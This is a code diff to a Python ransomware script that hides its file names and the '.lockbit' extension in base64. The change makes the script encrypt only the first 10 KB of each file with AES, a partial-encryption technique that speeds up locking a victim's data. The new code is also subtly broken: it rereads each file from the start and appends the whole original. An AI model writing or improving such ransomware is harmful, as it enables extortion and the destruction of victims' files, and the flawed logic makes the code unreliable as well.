@@ -13,6 +13,8 @@ ENCRYPTED_AES_KEY_FILE = b64decode('ZW5jcnlwdGVkX2Flc19rZXkuYmlu').decode('utf-8
 RANSOM_NOTE_FILE = b64decode('UkFOU09NX05PVEUudHh0').decode('utf-8')
 ENCRYPTED_FILE_EXTENSION = b64decode('bG9ja2JpdA==').decode('utf-8')
 
+# Define the number of kilobytes to encrypt
+KB_TO_ENCRYPT = 10
 
 # Generate RSA keys
 def generate_rsa_keys():
@@ -54,11 +56,11 @@ def encrypt_aes_key(aes_key, public_key):
     return encrypted_aes_key
 
 
-# Encrypt files with AES and rename to .lockbit
+# Encrypt only the first few kilobytes of files with AES and rename to .lockbit
 def encrypt_files(files, aes_key):
     for file in files:
         with open(file, "rb") as f:
-            data = f.read()
+            data = f.read(KB_TO_ENCRYPT * 1024)  # Read only the first few kilobytes
 
         iv = os.urandom(16)
         cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
@@ -68,8 +70,11 @@ def encrypt_files(files, aes_key):
         padded_data = padder.update(data) + padder.finalize()
         encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
 
+        with open(file, "rb") as f:
+            remaining_data = f.read()  # Read the remaining data
+
         with open(file, "wb") as f:
-            f.write(iv + encrypted_data)  # Prepend IV to the encrypted data
+            f.write(iv + encrypted_data + remaining_data)  # Prepend IV to the encrypted data and append remaining data
 
         os.rename(file, file + f'.{ENCRYPTED_FILE_EXTENSION}')
 
